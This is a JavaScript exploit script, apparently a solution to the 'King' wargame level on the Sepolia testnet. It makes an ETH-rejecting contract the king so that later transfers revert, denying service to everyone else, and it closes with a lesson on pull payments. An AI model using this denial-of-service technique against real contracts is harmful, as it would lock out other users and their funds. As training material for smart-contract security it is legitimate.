/**
 * King 合约攻击脚本
 *
 * 攻击原理：DoS（拒绝服务）攻击
 * 1. 部署一个拒绝接收 ETH 的合约
 * 2. 让这个合约成为 king
 * 3. 当别人试图成为新 king 时，King 合约会尝试向我们转账
 * 4. 我们拒绝接收，导致交易 revert
 * 5. 我们永远保持 king 身份
 *
 * EVM 层面原因：
 * - transfer() 只转发 2300 gas，失败会自动 revert
 * - 没有 receive() 的合约无法接收 ETH
 * - 整个交易回滚，king 不会改变
 */

import { createWalletClient, createPublicClient, http, parseEther } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { sepolia } from 'viem/chains';

const RPC_URL = process.env.sepolia_rpc;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const KING_ADDRESS = process.env.King_ADDRESS;
const ATTACK_ADDRESS = process.env.KingATTACK_ADDRESS; // 需要先部署

async function main() {
    const client = createPublicClient({
        chain: sepolia,
        transport: http(RPC_URL),
    });

    const account = privateKeyToAccount(PRIVATE_KEY);

    const walletClient = createWalletClient({
        account,
        chain: sepolia,
        transport: http(RPC_URL),
    });

    console.log('=== King DoS Attack ===\n');

    // 1. 查询当前状态
    const kingAbi = [
        {
            "inputs": [],
            "name": "_king",
            "outputs": [{"internalType": "address", "name": "", "type": "address"}],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "prize",
            "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
            "stateMutability": "view",
            "type": "function"
        }
    ];

    const currentKing = await client.readContract({
        address: KING_ADDRESS,
        abi: kingAbi,
        functionName: '_king'
    });

    const currentPrize = await client.readContract({
        address: KING_ADDRESS,
        abi: kingAbi,
        functionName: 'prize'
    });

    console.log('Current King:', currentKing);
    console.log('Current Prize:', currentPrize.toString(), 'wei');
    console.log('Current Prize:', Number(currentPrize) / 1e18, 'ETH\n');

    // 2. 发起攻击
    const attackAbi = [
        {
            "inputs": [{"internalType": "address payable", "name": "target", "type": "address"}],
            "name": "attack",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        }
    ];

    // 发送比当前 prize 更多的 ETH
    const attackValue = currentPrize + parseEther('0.0001');
    console.log('Attacking with:', Number(attackValue) / 1e18, 'ETH');

    const tx = await walletClient.writeContract({
        address: ATTACK_ADDRESS,
        abi: attackAbi,
        functionName: 'attack',
        args: [KING_ADDRESS],
        value: attackValue
    });

    console.log('Attack transaction hash:', tx);

    const receipt = await client.waitForTransactionReceipt({ hash: tx });
    console.log('Transaction status:', receipt.status === 'success' ? '✓ Success' : '✗ Failed');

    // 3. 验证结果
    console.log('\n=== Verification ===\n');

    const newKing = await client.readContract({
        address: KING_ADDRESS,
        abi: kingAbi,
        functionName: '_king'
    });

    const newPrize = await client.readContract({
        address: KING_ADDRESS,
        abi: kingAbi,
        functionName: 'prize'
    });

    console.log('New King:', newKing);
    console.log('New Prize:', newPrize.toString(), 'wei');
    console.log('Attack contract address:', ATTACK_ADDRESS);

    if (newKing.toLowerCase() === ATTACK_ADDRESS.toLowerCase()) {
        console.log('\n✓✓✓ Attack successful!');
        console.log('Our contract is now the king.');
        console.log('Anyone trying to become king will fail because we refuse to accept ETH.');
        console.log('\nTry it yourself:');
        console.log(`cast send ${KING_ADDRESS} --value ${Number(newPrize) / 1e18 + 0.001}ether --private-key $PRIVATE_KEY --rpc-url $sepolia_rpc`);
        console.log('↑ This will revert!');
    } else {
        console.log('\n✗ Attack failed');
    }

    console.log('\n=== Lesson ===');
    console.log('Never use transfer() to send ETH to arbitrary addresses.');
    console.log('Use the Pull Pattern instead of Push Pattern.');
}

main().catch(console.error);

/**
    forge create src/10-King/AttackKing.sol:AttackKing \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast 

 */